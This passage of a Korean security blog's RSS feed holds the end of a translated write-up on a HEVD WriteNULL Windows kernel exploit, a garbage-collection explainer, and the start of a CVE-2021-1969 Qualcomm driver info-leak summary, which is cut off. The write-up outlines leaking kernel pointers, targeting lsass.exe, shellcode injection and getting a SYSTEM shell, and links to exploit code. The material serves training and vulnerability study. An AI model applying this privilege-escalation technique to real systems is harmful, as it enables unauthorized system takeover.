&#xB8E8;&#xD504;&#xB85C; &#xB3CC;&#xBA70; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC218;&#xC9D1;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/27.png" alt></p><p>&#xC704; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; ring3&#xC5D0;&#xC11C; PID:4&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB178;&#xCD9C;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/28.png" alt></p><p>&#xBCF4;&#xC2DC;&#xB2E4;&#xC2DC;&#xD53C; &#xC77C;&#xBC18; &#xC720;&#xC800;&#xB85C;&#xB3C4; &#xD3EC;&#xC778;&#xD130;&#xC640; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB178;&#xCD9C; &#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD639;&#xC2DC; &#xAE30;&#xC5B5;&#xD558;&#xC2DC;&#xB098;&#xC694;? &#xC774; &#xD3EC;&#xC778;&#xD130;&#xB4E4;&#xC740; &#x201C;&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC1D;&#xCCB4;&#x201D;&#xC640; &#xC544;&#xC8FC; &#xBC00;&#xC811;&#xD55C; &#xAD00;&#xACC4;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/29.png" alt></p><p>&#xCC3E;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;! &#xD558;&#xC9C0;&#xB9CC; &#xC544;&#xC9C1; &#xBB38;&#xC81C;&#xAC00; &#xB0A8;&#xC544; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x201C;ASLR&#x201D;&#xC774; &#xB3D9;&#xC791;&#xD558;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xAC00;&#xC815;&#xD558;&#xC5D0; &#x201C;&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC1D;&#xCCB4;&#x201D; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xC8FC;&#xC18C;&#xB97C; &#xC608;&#xCE21;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC5B4;&#xB5A4; &#xC8FC;&#xC18C;, PID &#xBC0F; Handle &#xAC12;&#xC774; &#xC62C;&#xBC14;&#xB978;&#xC9C0; &#xC5B4;&#xB5BB;&#xAC8C; &#xC54C; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;?</p><p>&#xC774; &#xC9C8;&#xBB38;&#xC758; &#xB2F5;&#xC740;: &#x201C;&#xC800;&#xB3C4; &#xBAA8;&#xB985;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xBC29;&#xBC95;&#xC740; &#xC788;&#xC5B4;&#xC694;!&#x201D;</p><p>&#xC4F8;&#xB9CC;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; handle&#xC744; NULL&#xB85C; &#xCD08;&#xAE30;&#xD654; &#xD55C;&#xB2E4;&#xBA74; crash&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACA0;&#xC8E0;. &#xC774; &#xBC29;&#xBC95;&#xC744; &#xC5EC;&#xB7EC;&#xBC88; &#xBC18;&#xBCF5;&#xD574;&#xC11C; &#x201C;lsass.exe PID&#x201D;&#xB97C; &#xC815;&#xC758;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xBB34;&#xC791;&#xC815; handle&#xC744; NULL&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xBA74; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xAC00; crash&#xB098;&#xACE0; &#xC7AC;&#xBD80;&#xD305;&#xB420; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xC774; &#xBC29;&#xBC95;&#xC744; &#xC2E4;&#xC81C;&#xB85C; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC740; &#xAD8C;&#xC7A5;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/30.png" alt></p><p><img src="/2021/11/28/fabu1ous/write-null/31.png" alt></p><p>&#x201C;lsass.exe&#x201D;&#xC758; handle&#xB9CC;&#xC744; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xB3C4;&#xB85D; &#xCF54;&#xB4DC;&#xB97C; &#xC218;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#x201C;SYSTEM &#xD504;&#xB85C;&#xC138;&#xC2A4;&#x201D;&#xC5D0; &#x201C;&#xB204;&#xAD6C;&#xB098;&#x201D; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; &#xC0C1;&#xD669;&#xC744; &#xB9CC;&#xB4E4;&#xC5C8;&#xB2E4;&#xBA74;, &#xC774;&#xC820; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#x201C;Shellcode Injection&#x201D;&#xC744; &#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/32.png" alt></p><p>&#x201C;nt authority/SYSTEM cmd.exe shell&#x201D;&#xC744; &#xD68D;&#xB4DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. crash&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xACE0; &#xC774;&#xC288;&#xC5C6;&#xC774; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC798; &#xB3D9;&#xC791;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><em>Final Exploit link:<a href="https://github.com/w4fz5uck5/3XPL01t5/tree/master/OSEE_Training/HEVD_exploits/windowsx86/[HEVD]-WriteNULL">https://github.com/w4fz5uck5/3XPL01t5/tree/master/OSEE_Training/HEVD_exploits/windowsx86/[HEVD]-WriteNULL</a> References:<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h</a> <a href="https://github.com/daem0nc0re/HEVD-CSharpKernelPwn/blob/master/HEVD_Win7x86/WriteNull/Program.cs">https://github.com/daem0nc0re/HEVD-CSharpKernelPwn/blob/master/HEVD_Win7x86/WriteNull/Program.cs</a> <a href="http://bprint.rewolf.pl/bprint/?p=1683">http://bprint.rewolf.pl/bprint/?p=1683</a> <a href="https://github.com/ZecOps/CVE-2020&#x2013;0796-LPE-POC/blob/master/poc.py">https://github.com/ZecOps/CVE-2020&#x2013;0796-LPE-POC/blob/master/poc.py</a> <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/windows-debugging-and-exploiting-part-4-ntquerysysteminformation/">https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/windows-debugging-and-exploiting-part-4-ntquerysysteminformation/</a></em></p></blockquote>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/system/">system</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/28/fabu1ous/write-null/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Garbage Collection</title>
      <link>https://hackyboiz.github.io/2021/11/26/poosic/garbage-collection/</link>
      <guid>https://hackyboiz.github.io/2021/11/26/poosic/garbage-collection/</guid>
      <pubDate>Fri, 26 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xAC00;&amp;#xBE44;&amp;#xC9C0; &amp;#xCEEC;&amp;#xB809;&amp;#xC158;&amp;#xC740; &amp;#xAC04;&amp;#xB2E8;&amp;#xD788; &amp;#xB9D0;&amp;#xD558;&amp;#xC790;&amp;#xBA74; &amp;#xB3D9;&amp;#xC801;&amp;#xC7</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xAC00;&#xBE44;&#xC9C0; &#xCEEC;&#xB809;&#xC158;&#xC740; &#xAC04;&#xB2E8;&#xD788; &#xB9D0;&#xD558;&#xC790;&#xBA74; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xAD00;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xAD00;&#xB9AC; &#xAE30;&#xBC95;&#xC758; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;. &#xB9AC;&#xC2A4;&#xD504;(Lisp)&#xB77C;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xC5B8;&#xC5B4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xAD00;&#xB9AC;&#xB97C; &#xC704;&#xD574; 1959&#xB144;&#xC5D0; &#xAC1C;&#xBC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xC5B4;&#xB5BB;&#xAC8C;-&#xAD00;&#xB9AC;&#xD560;&#xAE4C;&#xC694;"><a href="#&#xC5B4;&#xB5BB;&#xAC8C;-&#xAD00;&#xB9AC;&#xD560;&#xAE4C;&#xC694;" class="headerlink" title="&#xC5B4;&#xB5BB;&#xAC8C; &#xAD00;&#xB9AC;&#xD560;&#xAE4C;&#xC694;?"></a>&#xC5B4;&#xB5BB;&#xAC8C; &#xAD00;&#xB9AC;&#xD560;&#xAE4C;&#xC694;?</h3><p>&#xAC00;&#xBE44;&#xC9C0; &#xCEEC;&#xB809;&#xC158;&#xC740; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED; &#xC911; &#xB354; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xAC70;&#xB098; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xC601;&#xC5ED;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xC5EC;&#xC11C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xD574;&#xC81C;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xAC00;&#xBE44;&#xC9C0; &#xCEEC;&#xB809;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB418;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBA38;&#xAC00; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xC644;&#xBCBD;&#xD558;&#xAC8C; &#xAD00;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xB429;&#xB2C8;&#xB2E4;! &#xADF8;&#xB798;&#xC11C; memory leak, double free &#xC640; &#xAC19;&#xC740; &#xC5EC;&#xB7EC; &#xBC84;&#xADF8;&#xB97C; &#xBC29;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBB3C;&#xB860;, &#xAC00;&#xBE44;&#xC9C0; &#xCEEC;&#xB809;&#xC158;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC5D0; &#xB300;&#xD55C; &#xCD94;&#xC801;&#xC5D0; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xC2DC;&#xAC04;&#xACFC; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xACE0;, &#xADF8;&#xB85C; &#xC778;&#xD574; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC131;&#xB2A5;&#xC774; &#xC800;&#xD558; &#xB429;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, &#xAC00;&#xBE44;&#xC9C0; &#xCEEC;&#xB809;&#xC158;&#xC5D0; &#xC18C;&#xBAA8;&#xB418;&#xB294; &#xC2DC;&#xAC04;&#xC774; &#xC608;&#xCE21;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB2E4;&#xB294; &#xB2E8;&#xC810;&#xB3C4; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="&#xC5B4;&#xB5A4;-&#xAC83;&#xB4E4;&#xC774;-&#xC4F0;&#xB808;&#xAE30;-&#xCDE8;&#xAE09;-&#xBC1B;&#xB294;&#xAC74;&#xAC00;&#xC694;"><a href="#&#xC5B4;&#xB5A4;-&#xAC83;&#xB4E4;&#xC774;-&#xC4F0;&#xB808;&#xAE30;-&#xCDE8;&#xAE09;-&#xBC1B;&#xB294;&#xAC74;&#xAC00;&#xC694;" class="headerlink" title="&#xC5B4;&#xB5A4; &#xAC83;&#xB4E4;&#xC774; &#xC4F0;&#xB808;&#xAE30; &#xCDE8;&#xAE09; &#xBC1B;&#xB294;&#xAC74;&#xAC00;&#xC694;?"></a>&#xC5B4;&#xB5A4; &#xAC83;&#xB4E4;&#xC774; &#xC4F0;&#xB808;&#xAE30; &#xCDE8;&#xAE09; &#xBC1B;&#xB294;&#xAC74;&#xAC00;&#xC694;?</h3><p>&#xAC00;&#xBE44;&#xC9C0; &#xCEEC;&#xB809;&#xC158;&#xC5D0;&#xC11C; &#xAC00;&#xBE44;&#xC9C0;&#xB77C;&#xACE0; &#xBD80;&#xB974;&#xB294; &#xAC83;&#xB4E4;&#xC740; &#xC704;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xD588;&#xB2E4;&#xC2DC;&#xD53C; &#xB354; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xC2DC;&#xB97C; &#xD1B5;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">int</span>* p = <span class="hljs-number">0</span>; p = (<span class="hljs-keyword">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<span class="hljs-comment">//&#xD560;&#xB2F9; &#xC601;&#xC5ED;1</span>*p = <span class="hljs-number">4</span>;p = (<span class="hljs-keyword">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<span class="hljs-comment">//&#xD560;&#xB2F9; &#xC601;&#xC5ED;2</span>*p = <span class="hljs-number">5</span>;</code></pre><p>&#xC704;&#xC758; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xCC98;&#xC74C; &#xD560;&#xB2F9; &#xC601;&#xC5ED;1 &#xC8FC;&#xC18C;&#xB97C; &#xD3EC;&#xC778;&#xD130; p&#xC758; &#xAC12;&#xC73C;&#xB85C; &#xC8FC;&#xACE0; p&#xC5D0; &#xADF8;&#xB300;&#xB85C; &#xD560;&#xB2F9; &#xC601;&#xC5ED;2&#xC758; &#xC2DC;&#xC791;&#xC8FC;&#xC18C;&#xB97C; &#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xD560;&#xB2F9; &#xC601;&#xC5ED;1&#xC758; &#xC8FC;&#xC18C;&#xB294; &#xB2E4;&#xC2DC; &#xCC3E;&#xC544;&#xC11C; &#xC774;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;?</p><p>&#xC548;&#xD0C0;&#xAE5D;&#xAC8C;&#xB3C4; &#xC704;&#xCC98;&#xB7FC; &#xD560;&#xB2F9; &#xC601;&#xC5ED;&#xC758; &#xC2DC;&#xC791;&#xC8FC;&#xC18C;&#xB97C; &#xB530;&#xB85C; &#xC800;&#xC7A5;&#xD574;&#xB193;&#xC9C0; &#xC54A;&#xB294; &#xD55C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC5C6;&#xC5B4;&#xC9C4; &#xD560;&#xB2F9; &#xC601;&#xC5ED;&#xC740; &#xB2E4;&#xC2DC; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xAC83;&#xB4E4;&#xC744; &#xAC00;&#xBE44;&#xC9C0; &#xCEEC;&#xB809;&#xC158;&#xC5D0;&#xC11C; &#xAC00;&#xBE44;&#xC9C0;&#xB85C; &#xCDE8;&#xAE09;&#xB418;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="Tracing-Garbage-Collection"><a href="#Tracing-Garbage-Collection" class="headerlink" title="Tracing Garbage Collection"></a>Tracing Garbage Collection</h3><p>&#xCCAB; &#xBC88;&#xC9F8; &#xC791;&#xB3D9;&#xBC29;&#xC2DD;&#xC740; Tracing Garbage Collection&#xC785;&#xB2C8;&#xB2E4;. &#xAC00;&#xC7A5; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC00;&#xBE44;&#xC9C0; &#xCF5C;&#xB809;&#xC158; &#xC791;&#xB3D9;&#xBC29;&#xBC95;&#xC774;&#xBA70;Tracing&#xC774; &#xBD99;&#xC740; &#xAC83; &#xCC98;&#xB7FC; &#xCD94;&#xC801;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC791;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC791;&#xB3D9; &#xBC29;&#xC2DD;&#xC740; &#xD2B9;&#xC815;&#xD55C; &#xD0C0;&#xC774;&#xBC0D;&#xC5D0; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC791;&#xB3D9; &#xC911; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC870;&#xC0AC;&#xD558;&#xC5EC; &#xD604;&#xC7AC; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD55C;&#xC9C0;, &#xBD88;&#xAC00;&#xB2A5;&#xD55C;&#xC9C0; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD1B5;&#xD574; &#xCD94;&#xC801;&#xD558;&#xC5EC; <code>&#xC4F0;&#xB808;&#xAE30;</code>&#xB85C; &#xD310;&#xB2E8;&#xB418;&#xBA74; &#xAC00;&#xBE44;&#xC9C0; &#xCEEC;&#xB809;&#xC158;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9; &#xD574;&#xC81C;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>Tracing Garbage Collection &#xBC29;&#xC2DD;&#xB3C4; &#xC138;&#xBD80;&#xC801;&#xC778; &#xC791;&#xB3D9;&#xC5D0; &#xB530;&#xB77C; mark and sweep &#xAE30;&#xBC95;, &#xC0BC;&#xC0C9; &#xD45C;&#xAE30; &#xAE30;&#xBC95;, &#xAC1D;&#xCCB4; &#xC774;&#xB3D9; &#xAE30;&#xBC95;, &#xC138;&#xB300; &#xB2E8;&#xC704; &#xAC00;&#xBE44;&#xC9C0; &#xCEEC;&#xB809;&#xC158; &#xAE30;&#xBC95;&#xC73C;&#xB85C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;.</p><h3 id="Reference-Counting"><a href="#Reference-Counting" class="headerlink" title="Reference Counting"></a>Reference Counting</h3><p>&#xB450; &#xBC88;&#xC9F8; &#xC791;&#xB3D9;&#xBC29;&#xC2DD;&#xC740; Reference Counting&#xC785;&#xB2C8;&#xB2E4;. <code>&#xD69F;&#xC218; &#xCC38;&#xC870;</code>&#xB77C;&#xB294; &#xC601;&#xC5B4;&#xC758; &#xD574;&#xC11D; &#xADF8;&#xB300;&#xB85C; &#xAC01; &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xCC38;&#xC870; &#xD69F;&#xC218;&#xB97C; &#xCE74;&#xC6B4;&#xD2B8;&#xD558;&#xC5EC; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xACFC; &#xBD88;&#xAC00;&#xB2A5;&#xC744; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC774;&#xC5D0;&#xC694;. &#xD55C; &#xAC1D;&#xCCB4;&#xAC00; &#xB2E4;&#xB978; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xB420; &#xB54C; 1&#xC744; &#xB354;&#xD558;&#xACE0; &#xCC38;&#xC870;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBA48;&#xCD94;&#xBA74; 1&#xC744; &#xBE7C;&#xC11C; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;&#xAC00; 0&#xC774; &#xB418;&#xBA74; &#xC544;&#xBB34;&#xB3C4; &#xC811;&#xADFC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xD310;&#xB2E8;&#xD574; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC791;&#xB3D9;&#xBC29;&#xC2DD;&#xC774; &#xC774;&#xB807;&#xAC8C; &#xAC04;&#xB2E8;&#xD558;&#xB2E4; &#xBCF4;&#xB2C8; &#xAD6C;&#xD604;&#xB3C4; &#xB9E4;&#xC6B0; &#xAC04;&#xB2E8;&#xD574; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xD574;&#xB2F9; &#xC791;&#xB3D9;&#xBC29;&#xC2DD;&#xC740; &#xC21C;&#xD658; &#xCC38;&#xC870; &#xBB38;&#xC81C;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;! &#xC21C;&#xD658; &#xCC38;&#xC870;&#xB780; &#xB3CC;&#xACE0; &#xB3CC;&#xC544; &#xC790;&#xAE30; &#xC790;&#xC2E0;&#xC744; &#xCC38;&#xC870;&#xD558;&#xAC8C; &#xB418;&#xB294; &#xACBD;&#xC6B0;&#xB97C; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; A&#xAC00; B&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; B&#xAC00; A&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB41C;&#xB2E4;&#xBA74; &#xB450; &#xBA54;&#xBAA8;&#xB9AC; &#xBAA8;&#xB450; &#xC811;&#xADFC;&#xD560; &#xC218;&#xB294; &#xC5C6;&#xC9C0;&#xB9CC;, &#xCC38;&#xC870; &#xD69F;&#xC218;&#xAC00; 0&#xC774; &#xB418;&#xC9C0; &#xC54A;&#xC544; &#xD574;&#xC81C;&#xD560; &#xC218;&#xAC00; &#xC5C6;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xCE74;&#xC6B4;&#xD305;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD574;&#xACB0;&#xB420; &#xAC83; &#xAC19;&#xC9C0;&#xB9CC; &#xADF8;&#xB807;&#xAC8C; &#xB418;&#xBA74; &#xD574;&#xC81C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xCC38;&#xC870;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xCE74;&#xC6B4;&#xD305;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/garbage-collection/">garbage collection</category>
      
      <category domain="https://hackyboiz.github.io/tags/lisp/">lisp</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/26/poosic/garbage-collection/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-1969: Information leak in Qualcomm npu driver </title>
      <link>https://hackyboiz.github.io/2021/11/25/l0ch/2021-11-25/</link>
      <guid>https://hackyboiz.github.io/2021/11/25/l0ch/2021-11-25/</guid>
      <pubDate>Thu, 25 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-1031-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-1031-npu/">GHSL-2021-1031: Information leak in Qualcomm npu driver - CVE-2021-1969</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>MSM Linux(Support Qualcomm chip)</p><p>&#xD14C;&#xC2A4;&#xD2B8;&#xB41C; &#xBC84;&#xC804;</p><ul><li>Samsung Galaxy A71: SM-A715F/DS<ul><li>AP: A715FXXU3ATJ2</li><li>CP: A715FXXU3ATI5</li><li>Kernel version 4.14.117-19828683</li><li>build ID QP1A.190711.020.A715FXXU3ATJ2</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD004;&#xCEF4;&#xC758; Neural Processing Unit, NPU&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB294; Information disclosure &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p> &#xC544;&#xB798; &#xCF54;&#xB4DC;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; <code>npu_receive_event</code> &#xD568;&#xC218;&#xC758; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;. <code>MSM_NPU_RECEIVE_EVENT</code> IOCTL&#xC774; &#xD638;&#xCD9C;&#xB418;&#xBA74;  <code>msm_npu_event</code> &#xAD6C;&#xC870;&#xCCB4;&#xAC00; &#xC720;&#xC800;&#xB79C;&#xB4DC;&#xB85C; &#xBCF5;&#xC0AC;&#xB429;&#xB2C8;&#xB2E4;.  </p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">npu_receive_event</span><span class="hljs-params">(struct npu_client *client, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg)</span></span><span class="hljs-function"></span>{    ...<span class="hljs-keyword">if</span> (list_empty(&amp;client-&gt;evt_list)) {        ...} <span class="hljs-keyword">else</span> {kevt = list_first_entry(&amp;client-&gt;evt_list, struct npu_kevent, <span class="hljs-built_in">list</span>);list_del(&amp;kevt-&gt;<span class="hljs-built_in">list</span>);npu_process_kevent(kevt);  <span class="hljs-comment">/// copy to userland</span>ret = copy_to_user(argp, &amp;kevt-&gt;evt, <span class="hljs-keyword">sizeof</span>(struct msm_npu_event));...</code></pre><p>&#xC720;&#xC800;&#xB79C;&#xB4DC;&#xB85C; 